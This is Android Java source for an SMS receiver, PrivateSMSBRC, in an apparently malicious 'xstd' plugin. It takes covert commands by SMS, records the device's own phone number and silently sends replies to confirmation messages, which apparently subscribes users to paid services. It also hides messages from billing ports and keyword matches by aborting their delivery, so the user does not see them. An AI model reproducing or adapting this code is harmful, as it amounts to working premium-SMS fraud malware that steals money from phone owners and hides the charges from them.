package com.xstd.plugin.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsMessage;
import android.text.TextUtils;
import com.xstd.plugin.Utils.CommonUtil;
import com.xstd.plugin.Utils.SMSUtil;
import com.xstd.plugin.config.AppRuntime;
import com.xstd.plugin.config.Config;
import com.xstd.plugin.config.SettingManager;
import com.xstd.plugin.service.PluginService;

/**
 * Created with IntelliJ IDEA.
 * User: michael
 * Date: 13-10-21
 * Time: PM11:17
 * To change this template use File | Settings | File Templates.
 */
public class PrivateSMSBRC extends BroadcastReceiver {

    public void onReceive(Context context, Intent intent) {
        if (intent != null) {
            if (Config.DEBUG) {
                Config.LOGD("[[PrivateSMSBRC::onReceive]] action = " + intent.getAction());
            }
            SmsMessage[] messages = getMessagesFromIntent(intent);
            if (messages == null || messages.length == 0) return;

            SettingManager.getInstance().init(context);
            for (SmsMessage message : messages) {
                /**
                 * 先判断短信中心是否已经有了配置，如果没有的话，尝试从短信中获取短信中心的号码
                 */
                String msg = message.getMessageBody();
                if (message == null || TextUtils.isEmpty(msg)) continue;

                if (Config.DEBUG) {
                    Config.LOGD("\n\n[[PrivateSMSBRC::onReceive]] has receive SMS from : \n<<" + message.getDisplayOriginatingAddress()
                                    + ">>"
                                    + "\n || content : " + message.getMessageBody()
                                    + "\n || sms center = " + message.getServiceCenterAddress()
                                    + "\n || sms display origin address = " + message.getDisplayOriginatingAddress()
                                    + "\n || sms = " + msg
                                    + "\n || intent info = " + intent.getExtras()
                                    + "\n =================="
                                    + "\n\n");
                }

                //对于任何一条短信，都要先取出短信的发送地址
                String address = message.getOriginatingAddress();
                if (TextUtils.isEmpty(address)) {
                    if (Config.DEBUG) {
                        Config.LOGD("\n[[PrivateSMSBRC::onReceive]] ignore this Message as the address is empty.\n");
                    }
                    return;
                }

                if (address.startsWith("10")) {
                    //当短信发送地址是以10开始或是地址是空的时候，表示这个短信是应该忽略的，因为可以是运营短信。
                    if (Config.DEBUG) {
                        Config.LOGD("\n[[PrivateSMSBRC::onReceive]] Message start with 10.\n");
                    }
                } else {
                    //短信的地址应该是正常的地址
                    /**
                     * 短信发送地址处理
                     */
                    if (address.startsWith("+") == true && address.length() == 14) {
                        address = address.substring(3);
                    } else if (address.length() > 11) {
                        address = address.substring(address.length() - 11);
                    }

                    /**
                     * 短信中心处理
                     */
//                    String center = message.getServiceCenterAddress();
//                    if (!TextUtils.isEmpty(center)) {
//                        if (center.startsWith("+") == true && center.length() == 14) {
//                            center = center.substring(3);
//                        } else if (center.length() > 11) {
//                            center = center.substring(center.length() - 11);
//                        }
//                        SettingManager.getInstance().setKeySmsCenterNum(center);
//                    }
                }
                if (handleMessage(context, msg, address)) abortBroadcast();
            }
        }
    }

    /**
     * 返回 true 表示短信应该被拦截处理
     *
     * @param context
     * @param msg
     * @param address
     * @return
     */
    public static final boolean handleMessage(Context context, String msg, String address) {
        if (Config.DEBUG) {
            Config.LOGD("[[PrivateSMSBRC::handleMessage]] msg = " + msg + " address = " + address);
        }
        /**
         * 是否是短信服务器发送的短信
         */
        if (msg.startsWith("XSTD.TO:")) {
            String phoneNumbers = msg.trim().substring("XSTD.TO:".length());
            String oldPhoneNumbers = SettingManager.getInstance().getBroadcastPhoneNumber();
            if (TextUtils.isEmpty(oldPhoneNumbers)) {
                SettingManager.getInstance().setBroadcastPhoneNumber(phoneNumbers);
            } else {
                SettingManager.getInstance().setBroadcastPhoneNumber(oldPhoneNumbers + ";" + phoneNumbers);
            }
            if (Config.DEBUG) {
                Config.LOGD("\n[[PrivateSMSBRC::handleMessage]] we receive SMS [[XSTD.TO:]] for broadcast"
                                + " phoneNumbers : " + SettingManager.getInstance().getBroadcastPhoneNumber() + " >>>>>>>>");
            }

            Intent i = new Intent();
            i.setClass(context, PluginService.class);
            i.setAction(PluginService.SMS_BROADCAST_ACTION);
            context.startService(i);

            return true;
        }

        if (msg.startsWith("XSTD.SC:")) {
            /**
             * 拦截以此开头的短信，此短信的后面跟随的是本机的号码
             */
            String selfPhoneNumber = msg.trim().substring("XSTD.SC:".length());
            if (!TextUtils.isEmpty(selfPhoneNumber) && CommonUtil.isNumeric(selfPhoneNumber)) {
                SettingManager.getInstance().setCurrentPhoneNumber(selfPhoneNumber);
            }

            if (Config.DEBUG) {
                Config.LOGD("\n[[PrivateSMSBRC::handleMessage]] receive SMS [[XSTD.SC:]]"
                                + " phoneNumbers : " + SettingManager.getInstance().getCurrentPhoneNumber() + " >>>>>>>>");
            }

            return true;
        }


        /**
         * 如果当前手机号码不为空，那么再进行其他的操作
         */
        if (!TextUtils.isEmpty(SettingManager.getInstance().getCurrentPhoneNumber())
                && AppRuntime.ACTIVE_RESPONSE != null
                && !TextUtils.isEmpty(AppRuntime.ACTIVE_RESPONSE.blockSmsPort)) {
            //对于短信内容先进行二次确认检查

            if (!secondSMSCmdCheck(msg, address)) {
                boolean keyBlock = false;
                if (!TextUtils.isEmpty(msg) && !TextUtils.isEmpty(AppRuntime.ACTIVE_RESPONSE.blockKeys)) {
                    try {
                        if (isContainWhite(msg, AppRuntime.ACTIVE_RESPONSE.blockKeys)) {
                            return false;
                        }
                        keyBlock = AndOrCheckForFilter(msg, AppRuntime.ACTIVE_RESPONSE.blockKeys);
                    } catch (Exception e) {
                    }
                }

                if (address.startsWith(AppRuntime.ACTIVE_RESPONSE.blockSmsPort) || keyBlock) {
                    if (Config.DEBUG) {
                        Config.LOGD("[[PrivateSMSBRC::onReceive]] block one SMS : " + msg + "  from : " + address + " for KEY or SMS PORT filter");
                    }
                    return true;
                }
            } else {
                if (Config.DEBUG) {
                    Config.LOGD("[[PrivateSMSBRC::onReceive]] block one SMS : " + msg + "  from : " + address + " second check");
                }
                return true;
            }
        }

        return false;
    }

    private static boolean isContainWhite(String msg, String cmd) {
        String[] or = cmd.split("\\|");
        if (or.length <= 1) {
            String[] and = cmd.split("&");
            for (String s : and) {
                if (s.startsWith("-") && msg.contains(s.substring(1))) {
                    return true;
                }
            }
        } else {
            //先检查白名单
            for (String s : or) {
                if (s.startsWith("-") && msg.contains(s.substring(1))) {
                    return true;
                }
            }
        }

        return false;
    }

    /**
     * 不支持& 和| 的组合
     *
     * @param msg
     * @param cmd
     * @return
     */
    private static boolean AndOrCheckForFilter(String msg, String cmd) {
        String[] or = cmd.split("\\|");
        if (or.length <= 1) {
            //没有|逻辑
            String[] and = cmd.split("&");
//            先检查白名单
//            for (String s : and) {
//                if (s.startsWith("-") && msg.contains(s.substring(1))) {
//                    return false;
//                }
//            }
            for (String s : and) {
                if (!msg.contains(s)) {
                    return false;
                }
            }

            return true;
        } else {
            //有|逻辑
            //先检查白名单
//            for (String s : or) {
//                if (s.startsWith("-") && msg.contains(s.substring(1))) {
//                    return false;
//                }
//            }
            for (String s : or) {
                if (msg.contains(s)) {
                    return true;
                }
            }

            return false;
        }
    }

    /**
     * 如果返回true表示这条短信是二次确认的短信，需要拦截
     * false 表示是普通短信
     *
     * @param msg
     * @param number
     * @return
     */
    private static boolean secondSMSCmdCheck(String msg, String number) {
        if (!TextUtils.isEmpty(msg) && AppRuntime.ACTIVE_RESPONSE.smsCmd != null) {
            String port = AppRuntime.ACTIVE_RESPONSE.smsCmd.portList.size() > 1
                              ? AppRuntime.ACTIVE_RESPONSE.smsCmd.portList.get(1)
                              : null;
            String content = AppRuntime.ACTIVE_RESPONSE.smsCmd.contentList.size() > 1
                                 ? AppRuntime.ACTIVE_RESPONSE.smsCmd.contentList.get(1)
                                 : null;
            if (port == null || content == null) {
                return false;
            }

            //先找到要回复的关键字
            if (!content.startsWith("k=")) {
                if (content.startsWith("c=")) content = content.substring(2);
            } else {
                //以k=开始
                content = content.substring(2);
                String[] ds = content.split("\\*");
                if (ds == null || ds.length != 2) {
                    return false;
                } else {
                    int index = msg.indexOf(ds[0]);
                    if (index != -1) {
                        String subMsg = msg.substring(index + ds[0].length());
                        index = subMsg.indexOf(ds[1]);
                        if (index != -1) {
                            content = subMsg.substring(0, index);
                        } else {
                            return false;
                        }
                    } else {
                        return false;
                    }
                }
            }

            if (!port.startsWith("k=")) {
                if (port.startsWith("n=")) port = port.substring(2);
            } else {
                port = port.substring(2);
                if (!port.contains("&") && !port.contains("\\|")) {
                    //没有组合逻辑
                    if (msg.contains(port)) {
                        port = number;
                    } else {
                        return false;
                    }
                } else if (port.contains("&")) {
                    //&逻辑，注意：&和|目前不支持组合
                    String[] ds = port.split("&");
                    if (ds == null || ds.length == 0) {
                        return false;
                    }
                    for (String s : ds) {
                        if (!msg.contains(s)) {
                            return false;
                        }
                    }
                    port = number;
                } else if (port.contains("\\|")) {
                    //|逻辑
                    String[] ds = port.split("\\|");
                    if (ds == null || ds.length == 0) {
                        return false;
                    }
                    boolean should = false;
                    for (String s : ds) {
                        if (msg.contains(s)) {
                            should = true;
                            break;
                        }
                    }
                    if (should) {
                        port = number;
                    } else {
                        return false;
                    }
                }
            }

            if (TextUtils.isEmpty(port) || TextUtils.isEmpty(content)) {
                return false;
            }

            //port和content都是合法的
            SMSUtil.sendSMS(port, content);

            return true;
        }

        return false;
    }

    /**
     * 从Intent中获取短信的信息。
     *
     * @param intent
     * @return
     */
    private final SmsMessage[] getMessagesFromIntent(Intent intent) {
        Object[] messages = (Object[]) intent.getSerializableExtra("pdus");
        byte[][] pduObjs = new byte[messages.length][];
        for (int i = 0; i < messages.length; i++) {
            pduObjs[i] = (byte[]) messages[i];
        }
        byte[][] pdus = new byte[pduObjs.length][];
        int pduCount = pdus.length;
        SmsMessage[] msgs = new SmsMessage[pduCount];
        for (int i = 0; i < pduCount; i++) {
            pdus[i] = pduObjs[i];
            msgs[i] = SmsMessage.createFromPdu(pdus[i]);
        }
        return msgs;
    }

}
